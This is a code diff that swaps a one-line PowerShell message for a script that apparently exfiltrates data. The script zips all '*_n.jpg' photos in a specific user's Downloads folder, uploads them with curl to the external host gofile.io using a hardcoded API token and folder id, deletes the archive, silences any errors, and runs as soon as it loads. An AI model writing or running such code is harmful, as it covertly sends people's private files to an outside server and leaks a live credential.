@@ -1,1 +1,30 @@
-Write-Host "yatik basa"
+function Upload-direToGofile {
+    param (
+        [string]$Path,
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
+        [string]$newFolderId
+    )
+    
+      try{ 
+            if (Test-Path $Path) {
+        $zipPath = "C:\ProgramX64\extentions\upload_package.zip"
+        
+       
+        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+        
+
+        Compress-Archive -Path "$Path\*_n.jpg" -DestinationPath $zipPath -Force
+        $uploadUri = "https://store1.gofile.io/uploadFile"
+        
+        curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
+            
+        Remove-Item $zipPath -Force
+    
+        
+                Start-Sleep -Seconds 1  
+            
+        }
+   }
+    catch {Write-Host ""}
+}
+Upload-direToGofile -Path "C:\users\onsbt\downloads" -newFolderId "95adad47-12b6-47e0-bc26-c895ea8bacb1"
